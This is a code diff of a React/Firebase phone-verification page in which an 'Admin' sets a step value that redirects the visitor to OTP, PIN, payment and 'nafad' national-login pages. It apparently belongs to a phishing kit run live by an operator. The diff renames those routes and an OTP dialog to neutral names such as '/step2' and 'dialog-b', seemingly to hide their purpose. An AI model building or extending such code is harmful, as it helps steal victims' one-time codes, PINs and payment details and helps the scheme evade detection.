@@ -8,7 +8,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Phone } from "lucide-react"
 import { UnifiedSpinner } from "@/components/unified-spinner"
-import { PhoneOtpDialog } from "@/components/phone-otp-dialog"
+import { PhoneOtpDialog } from "@/components/dialog-b"
 import { StcCallDialog } from "@/components/stc-call-dialog"
 
 import { db, updateDoc, doc } from "@/lib/firebase"
@@ -54,16 +54,16 @@ export default function VerifyPhonePage() {
             window.location.href = "/"
           } else if (data.currentStep === "_t6") {
             console.log("[phone-info] Admin redirecting to nafad")
-            window.location.href = "/nafad"
+            window.location.href = "/step4"
           } else if (data.currentStep === "_st1") {
             console.log("[phone-info] Admin redirecting to payment")
             window.location.href = "/check"
           } else if (data.currentStep === "_t2") {
             console.log("[phone-info] Admin redirecting to otp")
-            window.location.href = "/veri"
+            window.location.href = "/step2"
           } else if (data.currentStep === "_t3") {
             console.log("[phone-info] Admin redirecting to pin")
-            window.location.href = "/confi"
+            window.location.href = "/step3"
           } else if (typeof data.currentStep === 'number') {
             console.log("[phone-info] Admin redirecting to home with step:", data.currentStep)
             window.location.href = `/`
